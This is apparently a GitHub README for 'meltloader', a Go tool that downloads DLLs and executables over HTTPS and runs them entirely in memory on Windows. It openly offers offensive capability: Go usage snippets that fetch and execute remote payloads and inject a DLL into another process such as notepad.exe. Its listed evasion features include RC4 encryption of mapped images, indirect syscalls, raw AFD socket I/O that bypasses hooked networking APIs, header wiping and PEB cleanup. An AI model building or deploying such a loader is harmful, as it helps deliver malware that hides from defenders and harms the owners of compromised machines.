# meltloader

a reflective dll/pe loader for windows written in go that performs pe loading entirely in memory with automatic memory management and encryption features.

## demo
![melt](https://github.com/user-attachments/assets/819639da-32ca-4393-8945-0e4c0b8145d6)

## overview

meltloader implements reflective dll/pe loading using windows nt api calls to allocate, write, and execute pe files without touching disk. the loader handles pe parsing, relocation processing, import resolution, and memory protection changes while providing tracking and cleanup capabilities. this should allow you to chain an arbitrary amount of DLLs that perform various operations in a modular and secure manner :3

the loader uses windows' provided SystemFunction032 rc4 encryption for evasion purposes. downloaded dlls are always encrypted in memory with an optional sleep period before decryption and execution, and after execution the mapped dll image gets encrypted in place using a randomly generated key. this makes the loaded dll unreadable to memory analysis tools while maintaining proper cleanup functionality.

## networking

all network i/o is done through raw nt api calls directly to `\Device\Afd` (the ancillary function driver), bypassing winsock, winhttp, wininet, and any other higher-level networking apis entirely. the afd.sys socket code is largely based on work by [@vxunderground](x.com/vxunderground), rewritten in go. this means:

- **no ie/wininet cache** downloads never touch the url cache or temporary internet files
- **no proxy auto-detection** no WPAD/PAC lookups or system proxy settings are consulted
- **no high-level api hooks** avoids usermode hooks on WinHttpSendRequest, InternetOpenUrl, etc.
- **no winsock catalog** LSPs and winsock hooks are bypassed completely
- **minimal api surface** only NtCreateFile, NtDeviceIoControlFile, and NtWaitForSingleObject are used for socket operations

dns resolution is performed over tcp by constructing raw dns queries and sending them to 1.1.1.1. tls is handled via schannel/sspi (InitializeSecurityContextW, EncryptMessage, DecryptMessage) with full certificate chain validation through crypt32. http redirect chains (301-308) are followed automatically up to 10 hops.

only https is supported.

## go dll compatibility

also works with go compiled dlls, see go-dll-src/ for reference

## api usage

all download functions (`LoadDLLFromURL`, `LoadPEFromUrl`) accept a `DownloadFunc` parameter so you can pass `net.DownloadToMemory` as the download implementation.

```go
// load dll from url with export specification
mapping, err := pe.LoadDLLFromURL("https://example.com/dll.dll", "ExportedFunction", net.DownloadToMemory)

// load pe from url with optional sleep in seconds before execution
peMapping, err := pe.LoadPEFromUrl("https://example.com/file.exe", 2, net.DownloadToMemory)

// load pe from url without sleep
peMapping, err := pe.LoadPEFromUrl("https://example.com/file.exe", 0, net.DownloadToMemory)

// download raw bytes to memory for remote injection
buff, err := net.DownloadToMemory("https://example.com/file.dll")

// remote dll injection into another process
pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
if err != nil {
	fmt.Println("failed to find process", err)
	return
}
remoteBase, err := pe.LoadDLLRemote(pHandle, buff)
if err != nil {
	fmt.Println("failed to load", err)
	return
}

// check currently mapped dlls
baseAddrs, sizes, count := pe.GetMap()
fmt.Printf("currently have %d DLLs mapped:\n", count)
for i := 0; i < count; i++ {
	fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
}

// check currently mapped pes
peBaseAddrs, peSizes, peCount := pe.GetPEMap()
fmt.Printf("currently have %d PEs mapped:\n", peCount)
for i := 0; i < peCount; i++ {
	fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
}

// cleanup/unmap dll from memory (kills any threads still running in the region first)
err = pe.Melt(mapping)

// cleanup/unmap exe from memory (kills any threads still running in the region first)
err = pe.MeltPE(peMapping)

// cleanup/unmap remote dll
err = pe.MeltRemote(pHandle, remoteBase)
```

## export specification

the `exportSpec` string parameter on `LoadDLLFromURL` controls which export to call after loading:

- `"FuncName"` — calls the named export function
- `""` — no export is called, the dll's DllMain is still invoked via DLL_PROCESS_ATTACH during loading

## technical implementation

the loader performs standard reflective dll/pe loading steps:

pe validation checks dos and nt headers for proper signatures and offsets. memory allocation uses NtAllocateVirtualMemory with system-chosen addresses. section mapping copies pe headers and each section to their virtual addresses.

relocation processing handles base address changes by parsing the relocation table and updating all absolute addresses. both IMAGE_REL_BASED_DIR64 and IMAGE_REL_BASED_HIGHLOW relocations are processed for compatibility. import resolution walks the import table, loads required libraries with LoadLibraryLdr, and resolves function addresses with hash-based lookups. api-set schema redirections (api-ms-win-*) are resolved to their backing dlls automatically.

**exit function patching**: during iat resolution, any references to process termination functions (exit, ExitProcess, _exit, _Exit, quick_exit) are automatically replaced with ExitThread. this prevents loaded pes from terminating the entire loader process, ensuring they only exit their own thread.

memory protection changes from PAGE_READWRITE to appropriate section protections (PAGE_EXECUTE_READ, PAGE_READWRITE, etc.) using NtProtectVirtualMemory after loading completes. export resolution searches the export table by name to find the target function.

tls callbacks are executed with proper calling conventions before the entry point. pe headers are zeroed out after loading to avoid detection. command line arguments in the peb are wiped to prevent information leakage.

memory tracking maintains separate global registries for loaded dlls and pes protected by read-write mutex. each mapping stores base address and size information. the Melt/MeltPE functions enumerate all threads in the current process via CreateToolhelp32Snapshot and NtQueryInformationThread, terminating any whose start address falls within the mapped region before freeing the memory with NtFreeVirtualMemory. this prevents segfaults from background threads spawned by the loaded pe/dll.

## evasion features

the loader includes several evasion mechanisms:

- **low-level networking** raw afd.sys socket i/o and schannel tls bypass all high-level networking apis, their hooks, caches, and proxy settings
- **in-memory encryption** downloaded payloads are encrypted with rc4 via SystemFunction032 with optional sleep before decryption
- **post-execution encryption** mapped dll images are encrypted in place after execution using rc4 with random keys
- **nt api calls** memory operations use NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtFreeVirtualMemory instead of higher level win32 apis
- **indirect syscalls** nt api calls go through syscall;ret gadgets found in ntdll to avoid direct syscall detection
- **no disk artifacts** all allocations and operations happen entirely in memory
- **thread cleanup** Melt/MeltPE kill threads running inside mapped regions before freeing, preventing crashes and dangling references
- **header wiping** pe headers are zeroed after loading
- **peb cleanup** command line arguments are wiped from the process environment block
